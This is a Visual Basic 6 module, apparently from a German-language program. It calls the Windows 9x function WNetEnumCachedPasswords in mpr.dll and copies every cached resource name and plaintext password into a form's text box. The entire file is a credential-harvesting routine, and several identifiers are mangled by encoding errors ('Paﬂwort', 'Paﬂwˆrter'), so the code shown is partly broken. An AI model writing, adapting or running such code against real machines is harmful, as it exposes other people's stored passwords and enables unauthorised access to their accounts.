Attribute VB_Name = "Module1"
Option Explicit

Declare Function WNetEnumCachedPasswords Lib "mpr.dll" _
        (ByVal s As String, ByVal i As Integer, ByVal b _
        As Byte, ByVal proc As Long, ByVal l As Long) As Long

Type PAﬂWORT_TYPE
  Eintrag As Integer
  Quelle As Integer
  Paﬂwort As Integer
  i As Byte
  nT As Byte
  Feld(1 To 1024) As Byte
End Type

Public Function CallBack(Ret As PAﬂWORT_TYPE, ByVal l&) As Integer
  Dim X%, AA$, Quelle$, Paﬂwort$

    For X = 1 To Ret.Quelle
      If Ret.Feld(X) <> 0 Then
        Quelle = Quelle & Chr$(Ret.Feld(X))
      Else
        Quelle = Quelle & " "
      End If
    Next X

    For X = Ret.Quelle + 1 To (Ret.Quelle + Ret.Paﬂwort)
      If Ret.Feld(X) <> 0 Then
        Paﬂwort = Paﬂwort & Chr$(Ret.Feld(X))
      Else
        Paﬂwort = Paﬂwort & " "
      End If
    Next X

    Form1.Text11.Text = " Q: " & Quelle & " P: " & Paﬂwort
    CallBack = True
    
End Function

Public Sub Paﬂwˆrter()
  Call WNetEnumCachedPasswords("", 0&, &HFF, AddressOf CallBack, 0&)
End Sub
